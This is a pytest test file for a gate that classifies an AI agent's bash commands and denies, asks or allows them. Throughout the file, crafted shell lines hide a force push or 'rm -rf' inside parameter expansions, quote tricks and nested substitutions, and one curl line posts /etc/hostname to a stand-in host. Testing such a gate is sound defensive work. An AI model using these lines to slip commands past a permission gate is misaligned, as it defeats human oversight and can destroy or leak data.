"""#143, #553, #554: the lexer reads ${..} words and $(( as bash's parser does, and keeps the reading before.

A command bash runs from inside a parameter word (`${X:-$(cmd)}`, `${y:-<(cmd)}`, a backquote) is classified, and a
deny on it holds. bash pairs a ' with the next one in a ${..} word, in double quotes too, so a } in quotes does not
end the word, and the command after the word is read. A $(( is arithmetic only when bash reads it so; else it is a
$( ) holding a subshell, whose commands are read (#553). `${!name}`, `${name@P}` and the same forms of the positional
parameters run a value the gate does not see, and ask (#554). Where bash's reading may differ from the one before
#143 anywhere in a call, classify reads the call that way too (the last of its `also` readings) and decide keeps the
stricter, so no line decides lower than before.

The lines go through gate.classify as a bash tool call, which is what the hook does; every command string here is
data for exo.gate.classify/decide, and none is run."""
import random
import sys

import pytest

from exo import gate
from exo.gate import _parse, decide, readings

_FORCE_DENY = {"gates": {"categories": {"force_push": "deny"}}}
_FORCE_LIST = {"gates": {"deny": ["force_push"]}}
_DELETE_DENY = {"gates": {"categories": {"delete": "deny"}}}
_DELETE_LIST = {"gates": {"deny": ["delete"]}}
_LOWERED = {"gates": {"categories": {"force_push": "deny", "opaque_exec": "act"}}}
PUSH = "git push --force origin main"


@pytest.fixture(autouse=True)
def _home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("EXO_HOME", str(home / ".exo"))
    for name in ("EXO_KEYS_FILE", "CLAUDE_CONFIG_DIR", "EXO_PRINCIPAL_STORE"):
        monkeypatch.delenv(name, raising=False)
    return home


def _c(line: str) -> gate.Classification:
    return gate.classify({"tool": "bash", "args": {"command": line}})


def _out(line: str, policy=None) -> str:
    return decide(_c(line), policy).outcome


def _categories(line: str) -> set[str]:
    """Each category any reading of the line has, its parts' too."""
    return {p.category for r in readings(_c(line)) for p in [r, *gate._each_part(r)]}


def _signals(line: str) -> set[str]:
    return {s for r in readings(_c(line)) for s in r.signals}


def _parses(line: str, cap: int = 100) -> int:
    """How many lines classify parses for the line (each nested source, each reading), counted rather than timed so
    load cannot change it. Fails as soon as the count passes cap."""
    calls, real = [0], gate._parse_line

    def counted(src):
        calls[0] += 1
        assert calls[0] <= cap, f"more than {cap} lines parsed"
        return real(src)
    gate._parse_line = counted
    try:
        _c(line)
    finally:
        gate._parse_line = real
    return calls[0]


def _steps(fn) -> int:
    """Lines of exo.gate that fn() runs: a count of the work done that does not depend on the machine's load."""
    count, code = [0], gate._parse.__code__.co_filename

    def local(frame, event, arg):
        count[0] += 1
        return local

    def tracer(frame, event, arg):
        return local if frame.f_code.co_filename == code else None
    previous = sys.gettrace()
    sys.settrace(tracer)
    try:
        fn()
    finally:
        sys.settrace(previous)
    return count[0]


# --- the issues' lines --------------------------------------------------------------------------------------------

_ISSUE_143 = {"gates": {"deny": ["force_push", "vcs_push", "delete", "web_post"]}}


@pytest.mark.parametrize("line", [
    "echo ${X:-$(git push --force origin main)}",
    ": ${X:=$(curl -X POST https://example.invalid/x -d @/etc/hostname)}",
    "echo ${x:-'}'} && rm -rf ./work",
])
def test_issue_143_lines_are_denied(line):
    """#143: each was `read` and allowed under the issue's deny list."""
    assert _out(line, _ISSUE_143) == "deny"


@pytest.mark.parametrize("policy", [_FORCE_LIST, _FORCE_DENY], ids=["deny-list", "category"])
@pytest.mark.parametrize("line", [
    # fdn-0's first blocking row: the quoted span ends at its closing '
    "echo \"${x#'${y'}\" ; git push --force origin main ; echo \"'}'}\"",
    # the second: a here-document opened in a ${..} word does not take the lines after it
    "echo ${x:-$(cat<<EOF)'\nEOF\n'}\ngit push --force origin main",
])
def test_review_blocking_rows_stay_denied(line, policy):
    """fdn-0's review of #158 (5641579458): both are denied on main, and must stay so."""
    assert _out(line, policy) == "deny"


@pytest.mark.parametrize("policy", [_DELETE_LIST, _DELETE_DENY], ids=["deny-list", "category"])
@pytest.mark.parametrize("line", [
    "echo \"${x#'${y'}\" ; rm -rf ./work ; echo \"'}'}\"",
    "echo ${x:-$(cat<<EOF)'\nEOF\n'}\nrm -rf ./work",
])
def test_review_blocking_rows_with_a_delete_stay_denied(line, policy):
    assert _out(line, policy) == "deny"


# --- commands in a ${..} word -------------------------------------------------------------------------------------

@pytest.mark.parametrize("word", [
    "${X:-$(git push --force origin main)}",
    '"${X:-$\'$(git push --force origin main)\'}"',
    "${X-$(git push --force origin main)}",
    "${X:=$(git push --force origin main)}",
    "${X=$(git push --force origin main)}",
    "${X:+$(git push --force origin main)}",
    "${X+$(git push --force origin main)}",
    "${X:?$(git push --force origin main)}",
    "${X?$(git push --force origin main)}",
    "${X/old/$(git push --force origin main)}",
    "${X//old/$(git push --force origin main)}",
    "${X#$(git push --force origin main)}",
    "${X##$(git push --force origin main)}",
    "${X%$(git push --force origin main)}",
    "${X%%$(git push --force origin main)}",
    "${X^$(git push --force origin main)}",
    "${X,$(git push --force origin main)}",
    "${a[$(git push --force origin main)]}",
    "${X:-`git push --force origin main`}",
    '${X:-"$(git push --force origin main)"}',
    "${X:-${Y:-$(git push --force origin main)}}",
    '${X:-$(echo ${Y:-$(git push --force origin main)})}',
    '"${X:-\'$(git push --force origin main)\'}"',
    "${y:-<(git push --force origin main)}",
    "${y:->(git push --force origin main)}",
    "${X:-$(( $(git push --force origin main) + 1 ))}",
])
def test_executable_parameter_words_retain_static_denial(word):
    line = "echo " + word
    assert "force_push" in _categories(line)
    assert _out(line, _FORCE_DENY) == _out(line, _FORCE_LIST) == "deny"


@pytest.mark.parametrize("word", [
    "${x:-'}'}", '${x:-"}"}', '${X:-$(printf "}")}',
    "${X:-${Y:-'}'}}", r"${X:-\}}",
])
def test_matching_brace_resumes_at_following_command(word):
    line = "echo " + word + " && rm -rf ./work"
    assert "delete" in _categories(line)
    assert _out(line, _DELETE_LIST) == "deny"


@pytest.mark.parametrize("word", [
    "${X}", "${X:-default}", "${X:-/tmp/path}", "${#X}", "${X%.*}", "${x/a/b}", "${x//a/b}", "${x:2:3}",
    "${X:-'$(git push --force origin main)'}",
    "'${X:-$(git push --force origin main)}'",
    r"${X:-\$(git push --force origin main)}",
    '"${X#\'$(git push --force origin main)\'}"',
    '"${y:-<(git push --force origin main)}"',
])
def test_literal_parameter_words_still_allow(word):
    assert _out("echo " + word) == "allow"


@pytest.mark.parametrize("word", ["${X", "${X:-'unclosed}", "${X:-$(echo hi}", "${X:-`echo hi}"])
def test_malformed_parameter_is_opaque(word):
    assert "indirection" in _signals("echo " + word)
    assert _out("echo " + word) == "ask"


def test_a_deep_parameter_nest_is_read_without_recursion():
    """A ${ } nest opens a level on a stack, not a recursion: one of 2,000 levels holds nothing to run, and the
    command after it is read."""
    word = "${X:-" * 2000 + "value" + "}" * 2000
    assert _out("echo " + word) == "allow"
    assert _out("echo " + word + " ; git push --force origin main", _FORCE_DENY) == "deny"


def test_nested_command_sources_are_listed():
    """Each $( ) body in a word is listed; one nested in it is listed when that body is read, a level deeper."""
    line = "echo ${X:-$(echo ${Y:-$(git push --force origin main)})}"
    _, subs, _ = _parse(line)
    assert subs == ["echo ${Y:-$(git push --force origin main)}"]
    assert _parse(subs[0])[1] == ["git push --force origin main"]
    assert _out(line, _FORCE_DENY) == "deny"


@pytest.mark.parametrize("line", [
    'echo "${x:-\'"\'}" && rm -rf ./work }',
    'echo "${x#\'"\'}"\nrm -rf ./work\necho }',
    'echo "${x%\'"\'}"\nrm -rf ./work\necho }',
    'echo "${x/\'"\'/z}"\nrm -rf ./work\necho }',
    'echo "${x:-$\'"\'}"\nrm -rf ./work\necho }',
    'echo "${x:-\'}"\'}" && rm -rf ./work \'\'',
    "echo \"${x#'}\"'}'\" ; rm -rf ./work # \"",
])
def test_single_quotes_inside_double_quoted_parameter_pair_like_bash(line):
    assert "delete" in _categories(line)
    assert _out(line, _DELETE_LIST) == "deny"


@pytest.mark.parametrize("line", [
    "echo \"${x#$'\\''}\" ; git push --force origin main",
    "echo \"${x%$'\\''}\" ; git push --force origin main",
    "echo \"${x/$'\\''/z}\" ; git push --force origin main",
    "echo \"${x^$'\\''}\" ; git push --force origin main",
    "echo ${x:-$'\\''} ; git push --force origin main",
])
def test_ansi_c_quote_inside_parameter_word_closes_where_bash_closes_it(line):
    """$'\\'' is one ANSI-C string to bash's parser, so the brace closes and the next command runs."""
    assert _out(line, _FORCE_DENY) == "deny"


def test_a_line_left_open_that_is_read_two_ways_is_opaque():
    """bash rejects it (unexpected end of file), and dash, the /bin/sh fallback, takes the ' inside "${x:-..}" as
    text and runs rm: both readings are read, and the line asks, or denies under a delete deny."""
    line = 'echo "${x:-\'}"; rm -rf ./work; echo \'}"\''
    assert "delete" in _categories(line)
    assert "indirection" in _signals(line)
    assert _out(line) == "ask"
    assert _out(line, _DELETE_LIST) == "deny"


@pytest.mark.parametrize("line", ["echo 'unclosed ; rm -rf ./work", 'echo "unclosed ; rm -rf ./work',
                                  f"echo 'unclosed ; {PUSH}", f'echo "unclosed ; {PUSH}', 'echo "$(', "export PS4='$(",
                                  f"echo $'unclosed ; {PUSH}", "echo $'unclosed ; rm -rf ./work \\'"])
def test_a_line_left_inside_a_quote_asks(line):
    """bash and dash both reject a line that ends inside a quote and run nothing, but a shell that closed the quote
    elsewhere would run the rest: the line has an opaque part and asks, under a deny and a catch-all log rule too.
    The reading before is kept as it was, so the part never makes the line one a rule allows."""
    log_all = {"gates": {"rules": [{"match": {"command": ".*"}, "decision": "log"}]}}
    assert len(readings(_c(line))) == 2
    for policy in (None, log_all, _FORCE_LIST, _DELETE_LIST):
        assert _out(line, policy) == "ask", policy


def test_a_line_left_inside_a_backquote_is_read_as_before():
    """A backquote is no quote here: a line left inside one is read as before, so a catch-all log rule logs it."""
    log_all = {"gates": {"rules": [{"match": {"command": ".*"}, "decision": "log"}]}}
    assert len(readings(_c("echo `true"))) == 1
    assert _out("echo `true", log_all) == "log"


@pytest.mark.parametrize("line", [
    "echo ${y:-<(git push --force origin main)}",
    "echo $((git push --force origin main) )",
    "echo $((true);(git push --force origin main))",
])
def test_command_substitutions_bash_runs_are_classified(line):
    assert "force_push" in _categories(line)
    assert _out(line, _FORCE_LIST) == "deny"


@pytest.mark.parametrize("line", [
    "cat <<EOF\n" + "${X:-" * 33 + "1" + "}" * 33 + "\n$(git push --force origin main)\nEOF",
    "echo $(( " + "${X:-" * 33 + "1" + "}" * 33 + " + $(git push --force origin main) ))",
    "echo $(cat <<EOF\n" + "${X:-" * 32 + "1" + "}" * 32 + "\n$(git push --force origin main)\nEOF\n)",
])
def test_a_deep_parameter_nest_in_a_heredoc_or_arithmetic_is_read_to_its_end(line):
    """A ${ } nest is no level of the _NEST cap: the $( ) after it in the same body is still read."""
    assert "force_push" in _categories(line)
    assert _out(line, _FORCE_DENY) == "deny"


@pytest.mark.parametrize("line", ["echo ${x:-$(true}", "echo ${x:-`true}"])
def test_substitution_left_open_in_a_parameter_word_is_opaque(line):
    assert "indirection" in _signals(line)
    assert _out(line) == "ask"


def test_locale_string_in_a_parameter_word_is_scanned_without_the_locale_signal():
    """A $".." inside ${...} is read by the word's scan: its $( ) is classified, and no locale-translation signal is
    added for it."""
    assert _out('echo ${x:-$"$(git push --force origin main)"}', _FORCE_DENY) == "deny"
    assert "locale translation" not in _signals('echo ${x:-$"hello"}')


# --- nesting and cost -------------------------------------------------------------------------------------------

@pytest.mark.parametrize("deep", [
    "$(" + "${X:-" * 33 + "1" + "}" * 33 + ")",
    "<(" * 33 + "true" + ")" * 33,
    "$(" * 33 + "echo {" + ")" * 33,
    # a quote in a comment or a heredoc body inside the over-deep $( ) is text, as in bash
    "$(" * 33 + "echo # it's\n" + ")" * 33,
    "$(" * 33 + "cat <<E\nit's )\nE\n" + ")" * 33,
    # a ${..} word in the over-deep part ends where the lexer ends it (_nest_end reads it as _Lexer._param does)
    "$(" * 33 + "echo ${x:-')'}" + ")" * 33,
    "$(" * 33 + "echo ${x:-$(echo ')')}" + ")" * 33,
])
def test_nesting_limit_skips_only_the_deep_word_and_reads_the_rest(deep):
    """The over-deep part asks on its own; a command after it is still classified."""
    assert _out(f"echo {deep}") == "ask"
    line = f"echo {deep} ; git push --force origin main"
    assert "force_push" in _categories(line)
    assert "indirection" in _signals(line)
    assert _out(line, _LOWERED) == "deny"


@pytest.mark.parametrize("deep", [
    "${X:-" * 33 + "1" + "}" * 33,
    "${X:-" * 33 + "'}'\"}\"" + "}" * 33,
    "$((" * 33 + "1" + "))" * 33,
    # bare brackets and $'..' inside a deep word are literal text for bash, not nesting
    "${X:-" * 33 + "(" + "}" * 33,
    "${X:-" * 33 + "{" + "}" * 33,
    "${X:-" * 33 + "$(echo {)" + "}" * 33,
    "${X:-" * 33 + "$'\\''" + "}" * 33,
    '"' + "${X:-" * 33 + "(" + "}" * 33 + '"',
])
def test_a_deep_word_with_nothing_to_run_is_read_and_the_rest_too(deep):
    """A ${ } nest is read to its end (#231), and so is plain arithmetic past the cap, as before: nothing in them
    runs, so they do not ask, and the command after them is classified."""
    assert _out(f"echo {deep}") == "allow"
    line = f"echo {deep} ; git push --force origin main"
    assert "force_push" in _categories(line)
    assert _out(line, _LOWERED) == "deny"


@pytest.mark.parametrize("line, outcome", [
    ("cat " + "<(" * 2000 + "true" + ")" * 2000, "ask"),
    ("echo " + "$((" * 2000 + "1" + "))" * 2000, "allow"),
])
def test_process_substitution_and_arithmetic_nests_are_read_quickly(line, outcome):
    assert _out(line) == outcome
    assert _parses(line) <= 40                     # one source per level the _NEST cap allows


@pytest.mark.parametrize("line", [
    "echo $(a $(a $(a $(a $(git push --force origin main)))))",
    "echo ${x:-$(a $(a $(git push --force origin main)))}",
    "echo ${x:-$(a ${y:-$(a \"$(git push --force origin main)\")})}",
    "echo $(( $(a $((a) ; (git push --force origin main) )) ) ; ( : ) ))",
    "echo $(a $(a $(a $(a " + "$(true) " * 40 + "$(git push --force origin main)))))",
])
def test_category_deny_reaches_nested_command_sources(line):
    """Each level up to the cap is read once, so a category deny holds."""
    assert _parses(line) <= 160
    assert "force_push" in _categories(line)
    assert _out(line, _FORCE_DENY) == "deny"


@pytest.mark.parametrize("line", [
    "echo " + "$(a " * 30 + "$(git push --force origin main)" + ")" * 30,
    "cat " + "<(a " * 30 + "<(git push --force origin main)" + ")" * 30,
    "echo ${x:-" + "$(a " * 30 + "$(git push --force origin main)" + ")" * 30 + "}",
    # in a ${..} word or a $(( read as a subshell, _WORD_NEST levels from the cap
    "echo ${x:-$(a $(a $(a $(git push --force origin main))))}",
    "echo " + "$(${x:-" * 4 + "$(git push --force origin main)" + "})" * 4,
])
def test_command_source_past_the_cap_asks(line):
    """Past the _NEST cap a part is not read (#334): the line asks, also under a category deny."""
    assert _parses(line) <= 160
    assert "unread nest" in _signals(line)
    assert _out(line) == _out(line, _FORCE_DENY) == "ask"


def test_a_subshell_nest_in_arithmetic_past_the_word_cap_is_not_read():
    """A $(( bash runs as a subshell is a level only bash's reading opens: its fourth level is not read, and asks.
    The reading before sees the push in the arithmetic text, so a deny on it still holds."""
    line = "echo " + "$(( $(: ${x:-))}) ; " * 4 + "git push --force origin main" + " ; ( : ) ))" * 4
    assert _parses(line) <= 160
    assert "unread nest" in _signals(line)
    assert _out(line) == "ask"
    assert _out(line, _FORCE_DENY) == _out(line, _FORCE_LIST) == "deny"


# Each kind of part only bash's reading opens, with the push at level k of it (its first $( or backquote is level 1).
_PART_LEVELS = {
    "cmd-word": lambda k: "echo ${x:-" + "$(a " * (k - 1) + f"$({PUSH})" + ")" * (k - 1) + "}",
    "procsub-in": lambda k: "echo ${x:-<(a " + "$(a " * (k - 2) + f"$({PUSH})" + ")" * (k - 2) + ")}",
    "procsub-out": lambda k: "echo ${x:->(a " + "$(a " * (k - 2) + f"$({PUSH})" + ")" * (k - 2) + ")}",
    "backquote": lambda k: "echo ${x:-`a " + "$(a " * (k - 2) + f"$({PUSH})" + ")" * (k - 2) + "`}",
    "arith-word": lambda k: "echo ${x:-$(( " + "$(a " * (k - 1) + f"$({PUSH})" + ")" * (k - 1) + " ))}",
    "subshell": lambda k: "echo $((echo '))' ; a " + "$(a " * (k - 2) + f"$({PUSH})" + ")" * (k - 2) + ") )",
    "span": lambda k: "echo \"${x:+'" + "$(a " * (k - 1) + f"$({PUSH})" + ")" * (k - 1) + "'}\"",
    "backquote-in-part": lambda k: "echo ${x:-$(a `a " + "$(a " * (k - 3) + f"$({PUSH})" + ")" * (k - 3) + "`)}",
    "funsub": lambda k: "echo ${ a " + "$(a " * (k - 1) + f"$({PUSH})" + ")" * (k - 1) + "; }",
}


@pytest.mark.parametrize("policy", [_FORCE_LIST, _FORCE_DENY], ids=["deny-list", "category"])
@pytest.mark.parametrize("kind", list(_PART_LEVELS))
def test_a_part_only_bash_opens_is_read_three_levels_deep(kind, policy):
    """Every kind of part only bash's reading opens is read _WORD_NEST + 1 = 3 levels deep, counted alike: a push at
    level 3 is denied, and one at level 4 is not read and asks (the reading before reads none of them)."""
    third, fourth = _PART_LEVELS[kind](3), _PART_LEVELS[kind](4)
    assert "force_push" in _categories(third)
    assert _out(third, policy) == "deny"
    assert "force_push" not in _categories(fourth)
    assert "unread nest" in _signals(fourth)
    assert _out(fourth, policy) == "ask"


def test_a_push_four_levels_deep_in_a_word_is_allowed_where_main_allows_it():
    """The known limit: the part past the depth is opaque_exec, so a rule allowing opaque_exec allows the line, as
    main allows it (main reads no part of the word)."""
    line = _PART_LEVELS["cmd-word"](4)
    assert _out(line, {"gates": {"categories": {"opaque_exec": "allow"}}}) == "allow"


def test_parts_past_the_calls_budget_are_cut_and_ask():
    """A classify call opens _WORD_PARTS parts only bash's reading opens; a part past them is cut as a part past the
    cap is, so a line of many costs a small multiple of the reading before. A push in the first word, at level 1, is
    read; parts are counted in classify order, so a deeper part early on a line can be cut by later ones."""
    words = " ".join("${x%d:-$(: %d)}" % (i, i) for i in range(gate._WORD_PARTS))
    late, early = f"echo {words} ${{y:-$({PUSH})}}", f"echo ${{y:-$({PUSH})}} {words}"
    assert "unread nest" in _signals(late)
    assert _out(late, _FORCE_DENY) == _out(late, _FORCE_LIST) == "ask"
    assert _out(early, _FORCE_DENY) == _out(early, _FORCE_LIST) == "deny"


@pytest.mark.parametrize("k", [15, 16, 17, 18, 20])
@pytest.mark.parametrize("action, policy", [(PUSH, _FORCE_LIST), (PUSH, _FORCE_DENY),
                                             ("rm -rf ./work", _DELETE_LIST), ("rm -rf ./work", _DELETE_DENY)],
                         ids=["push-list", "push-category", "delete-list", "delete-category"])
def test_an_over_deep_part_ending_elsewhere_keeps_the_reading_before(k, action, policy):
    """Past the cap _nest_end reads a ${..} word as bash does, so the part ends after the action; read as before it
    ends at the word's first } and the action is on the line. Both readings are decided."""
    line = "echo " + "$(" * k + ": ${x:-'}'' " + ")" * k + f" ; {action} ; '}} " + ")" * k
    assert _out(line, policy) == "deny"
    assert _out(line, {"gates": {"categories": {"opaque_exec": "allow"}}}) != "allow"


def test_an_over_deep_part_both_readings_end_alike_is_read_once():
    """A ${..} word past the cap that ends at its first } in both readings needs no second reading (its cost)."""
    line = "echo " + "$( ( $(: ${x:-))}) ; " * 25 + "( : ) ))" * 25
    assert len(readings(_c(line))) == 1


# --- expansions that run a value (#554) ---------------------------------------------------------------------------

@pytest.mark.parametrize("word", [
    "${x@P}", '"${arr[0]@P}"', "${!x}", "${!x:-y}", "${!arr[1]}",
    # each positional parameter is prompt-expanded, or its value is used as a variable name (`a[$(..)]` runs)
    "${@@P}", "${*@P}", '"${@@P}"', "${!@}", "${!*}", "${!@:-y}", "${@:1@P}", "${*:2@P}",
    # an operator after the indirection does not make it a listing form: bash still reads the value as a name
    "${!@@P}", "${!*@P}", "${!@@Q}", "${!*@Q}", "${!x@P}", "${!x@Q}", "${!1@Q}",
    # nor does an empty operator after @: bash reads $@ as names (running `a[$(..)]`) before it fails
    "${!@@}",
])
def test_expansions_that_run_the_variables_value_ask(word):
    assert "indirection" in _signals("echo " + word)
    assert _out("echo " + word) == "ask"


@pytest.mark.parametrize("line", [
    "set -- '$(git push --force origin main)'; echo ${@@P}",
    "set -- '$(git push --force origin main)'; echo ${*@P}",
    "set -- '$(git push --force origin main)'; echo \"${@@P}\"",
    "set -- '$(git push --force origin main)'; echo ${@:1@P}",
    "set -- 'a[$(git push --force origin main)]'; echo ${!@}",
    "set -- 'a[$(git push --force origin main)]'; echo ${!*}",
])
def test_positional_parameters_run_through_a_value_ask(line):
    """#554: the value is not read, so the line asks like `${name@P}`, also under a force_push deny."""
    assert "indirection" in _signals(line)
    assert _out(line) == _out(line, _FORCE_DENY) == _out(line, _FORCE_LIST) == "ask"


@pytest.mark.parametrize("word", [
    "${!x*}", "${!x@}", "${!arr[@]}", "${!arr[*]}", "${x@Q}", "${x@a}", "${#x}", "${@@Q}", "${#@}", "${@}", "${!#}",
    "${x:-foo@P}",
])
def test_listing_and_inert_transformations_still_allow(word):
    assert _out("echo " + word) == "allow"


# --- a span in a double-quoted word ends at its quote ------------------------------------------------------------

@pytest.mark.parametrize("line", [
    "echo \"${x#'${y'}\" ; git push --force origin main ; echo \"'}\"",
    "echo \"${x#'${y'}\" ; git push --force origin main ; echo \"'}'}\"",
    "echo \"${x:-'${y'}\" ; git push --force origin main ; echo \"'}\"",
    "echo \"${x:-'$(y'}\" ; git push --force origin main ; echo \"')}\"",
    "echo \"${x:-'`y'}\" ; git push --force origin main ; echo \"'`}\"",
    "echo \"${x:-$'${y'}\" ; git push --force origin main ; echo \"'}\"",
])
def test_scan_inside_a_quoted_span_stops_at_its_closing_quote(line):
    """bash ends the '..' span at its quote; an expansion opened inside it cannot take the next command."""
    assert "force_push" in _categories(line)
    assert _out(line, _FORCE_DENY) == _out(line, _FORCE_LIST) == "deny"
    assert _out(line, _LOWERED) == "deny"


def test_heredoc_in_a_quoted_span_does_not_take_the_following_lines():
    line = "echo \"${x#'$(cat<<EOF)'}\"\ngit push --force origin main\nEOF"
    assert _out(line, _FORCE_DENY) == "deny"


# --- $(( (#553) ------------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("quoted", ["'(('", '"(("', "$'(('", "'))'", '"))"', "$'))'", "'('", "\\(", "\\)"])
@pytest.mark.parametrize("action, policy", [(PUSH, _FORCE_LIST), (PUSH, _FORCE_DENY),
                                             ("rm -rf ./work", _DELETE_LIST), ("rm -rf ./work", _DELETE_DENY)],
                         ids=["push-list", "push-category", "delete-list", "delete-category"])
def test_quoted_parentheses_do_not_make_a_command_substitution_arithmetic(quoted, action, policy):
    """bash matches a $(( with its quotes stepped over; the text is no group that balances, so it is a $( ) that
    holds a subshell, and the command in it runs."""
    line = f"echo $((echo {quoted} ; {action}) )"
    assert _out(line, policy) == "deny"


@pytest.mark.parametrize("line", [
    "echo $((echo '((' ; git push --force origin main) )",
    "echo $(( '(' + '(' ))\ngit push --force origin main",
    "echo $(( '(' ) ; git push --force origin main ; echo ))",
    'echo $(( "(" ) ; git push --force origin main ; echo ))',
    "echo $(( \\( ) ; git push --force origin main ; echo ))",
    "echo $(( `echo ))` ; git push --force origin main ; echo ))",
    "echo $(( `echo ((` && git push --force origin main && echo ))",
    "echo ${x:-$((echo '((' ; git push --force origin main) )}",
    "echo $(( ${x#'(('} 1 )); git push --force origin main",
    # bash steps over nested $( ) (# comments in it included) and $'..' (with \' escaped) when it matches the
    # group, and reads it as $( ) when its parentheses do not balance with only quotes skipped (`))` in
    # backquotes), or when its second reading at expansion, which takes # comments and not ${ }, ends elsewhere
    'echo $(( "$(: "((" ; echo 1)" )) ; git push --force origin main # ))',
    'unset x; echo $(( "${x:+"(("}" 1 )) ; git push --force origin main # ))',
    "echo $(( $(echo 1 # ((\n) )) ; git push --force origin main # ))",
    "echo $(( $'\\'' ) ; git push --force origin main ; echo ' ))' ) ; echo \\'",
    "echo $(( ${x:-`echo ((`} | git push --force origin main | echo ))",
    "echo $(( x #(\n) ; git push --force origin main ; (echo) ))",
    "echo $(( x #`((`\n )) ; git push --force origin main # ))",
    # bash's balance check sees $'..' as a quoted string, \' escaped in it, so the ( in backquotes is counted
    "echo $(( $'\\'' ; git push --force origin main ; `echo ((` ))",
    "echo $(( $'\\'' `(` ; git push --force origin main ; echo ))",
    "echo $(( 1 + $'\\'' `(` | git push --force origin main | echo ))",
    "echo $(( $'\\''\ngit push --force origin main\n`echo ((` ))",
    "echo \"$(( $'\\'' ; git push --force origin main ; `echo ((` ))\"",
    # bash checks a nested $( ) as it prints it back: no comment, heredocs rewritten. Such a group is read as $( )
    "echo $(( `(` ; git push --force origin main ; $(: # )\n) ))",
    "echo $(( `(` ; git push --force origin main ; $(:\n# )\n) ))",
    "echo $(( `(` ; git push --force origin main ; $(: <<E\n)\nE\n) ))",
    "echo $(( $'\\''$( #(\n)${x#\\(}`#(` ; git push --force origin main ; #\n))",
    # a group that is not arithmetic is read up to where the parser ends the word, and the line goes on after it
    "echo $(( )#( )) ; git push --force origin main\n) ))",
    "echo $(( :)#(:) ) ; git push --force origin main\n) )",
    "echo $(( );#( )) ; git push --force origin main\n) ))",
    "echo $(( )|#( )) ; git push --force origin main\n) ))",
    "echo $(( (:) )#( )) ; git push --force origin main\n) ))",
    "x=$(( )#( )) ; git push --force origin main\n) ))",
    "echo $(( )#(\"${x#'('}\" )) ; git push --force origin main # ${x:-)}$(: # )\n) ))",
    # a ${ outside quotes is text to bash in the group: its first )) ends the word, the ${ is left open
    "echo $(( ${x#'a'b'c'))] | git push --force origin main",
    "echo $(( ${x:-))\ngit push --force origin main\n} ))",
    "echo $(( ${x:- #))\ngit push --force origin main\n} ))",
    "echo $(( ${x:-<(:)))\ngit push --force origin main\n} ))",
    "echo $(( ${x#$'<<'E'\n\\{\\'))] | git push --force origin main\n",
    # one that bash never closes (it rejects the line) is also read with every parenthesis counted
    "echo $(( #) )) ; git push --force origin main",
    "echo $(( 1 #) )) | git push --force origin main",
])
def test_arithmetic_matching_skips_quoted_parentheses(line):
    assert "force_push" in _categories(line)
    assert _out(line, _FORCE_DENY) == "deny"


@pytest.mark.parametrize("policy", [_FORCE_LIST, _FORCE_DENY], ids=["deny-list", "category"])
@pytest.mark.parametrize("line", [
    "echo $(( $(: ${x:-))}) ; git push --force origin main ; ( : ) ))",
    "echo $(( $(: ${x:-))}) && git push --force origin main || ( : ) ))",
    "x=$(( $(: ${x:-))}) ; git push --force origin main ; ( : ) ))",
    "echo ${y:-$(( $(: ${x:-))}) ; git push --force origin main ; ( : ) ))}",
    "echo $(( $(: ${x:-)}) ; git push --force origin main ; ( 1 ) ))",
    "echo $(( $(: ${x:-(}) ; git push --force origin main ))",
])
def test_parentheses_in_a_word_in_a_nested_substitution_count_in_the_balance_check(line, policy):
    """bash's parser does not count the parentheses of a ${..} in a $( ) nested in a $((, and chk_arithsub does: the
    text is no group that balances, so bash runs it as a $( ) holding a subshell (#553), and a count of every
    parenthesis, the reading before, ends the group elsewhere too."""
    assert _out(line, policy) == "deny"


def test_parentheses_in_a_word_in_a_nested_substitution_with_a_delete_deny():
    assert _out("echo $(( $(: ${x:-))}) ; rm -rf ./work ; ( 1 ) ))", _DELETE_LIST) == "deny"


@pytest.mark.parametrize("line", ["echo $(( $(: ${x:-()}) + 1 ))", "echo $(( ${x:-1} + $(echo 2) ))"])
def test_a_word_in_a_nested_substitution_that_balances_is_arithmetic(line):
    assert _out(line) == "allow"


@pytest.mark.parametrize("line", ["echo $(( $(echo 1 # c\n) + 1 ))", "echo $(( $(cat <<E\n1\nE\n) + 1 ))"])
def test_arithmetic_with_a_comment_in_a_nested_substitution_is_read_as_a_command_substitution(line):
    """Stricter than bash, which drops the comment, rewrites the heredoc and reads arithmetic: the gate does not
    model the text bash prints back, so it classifies the group's commands and the line asks."""
    assert "opaque_exec" in _categories(line)
    assert _out(line) == "ask"


@pytest.mark.parametrize("line", [
    'echo $(( 1 " ) ; git push --force origin main ; echo " ))',
    "echo $(( \\) ; git push --force origin main ; echo ))",
])
def test_text_bash_never_runs_as_a_command_stays_text(line):
    """bash 5.2 reads each as one arithmetic group (an error, nothing runs), and so does a count of every
    parenthesis."""
    assert _out(line, _FORCE_DENY) == "allow"


@pytest.mark.parametrize("line", ["echo $(( 1", "echo $(( (1 + 2)", "echo $(( 1 + (2 )",
                                  "echo $(( 1 ; git push --force origin main"])
def test_unclosed_arithmetic_is_opaque(line):
    """bash rejects a $(( it never closes and runs nothing on the line; it asks, also under a category deny."""
    assert "indirection" in _signals(line)
    assert _out(line) == _out(line, _FORCE_DENY) == "ask"


@pytest.mark.parametrize("line", [
    "echo $((1+2))", "echo $(( x ))", "echo $(( 1 + 2 ))", "echo $(( (1 + 2) * 3 ))", "echo $(( 1 + (2 * 3) ))",
    "echo $(( x > 1 ? 2 : 3 ))", "echo $(( 16#ff | 3 & 1 ))", "echo $(( $(wc -l < f) + 1 ))",
    "echo $(( `echo 1` + 2 ))", "echo $(( $'\\x31' + $(echo 2) ))", "echo $(( a[1] + 2 ))",
])
def test_closed_arithmetic_still_allows(line):
    assert _out(line) == "allow"


# --- the reading before #143 is kept ---------------------------------------------------------------------------

@pytest.mark.parametrize("line, category", [
    # dash, the /bin/sh fallback, has no <( ): it ends the word at its first } and runs the next line
    ("x=$(echo ${x:-<(} )\ngit push --force origin main\n})", "force_push"),
    ("( echo ${x:-<(} )\ngit push --force origin main\n}", "force_push"),
    ("echo $(echo ${x:-<(} )\nrm -rf ./work\n})", "delete"),
    # dash takes a ' inside "${x:-..}" as text, so the word ends at its first } there too
    ("echo \"${x:-'}\" ; rm -rf ./work ; echo \"'}\"", "delete"),
    ("echo \"${x:+'}\" ; git push --force origin main ; echo \"'}\"", "force_push"),
    ("echo \"${x:-'}\"; rm -rf ./work; echo '}\"'", "delete"),
    ("echo $(echo ${x#>(} )\ngit push --force origin main\n})", "force_push"),
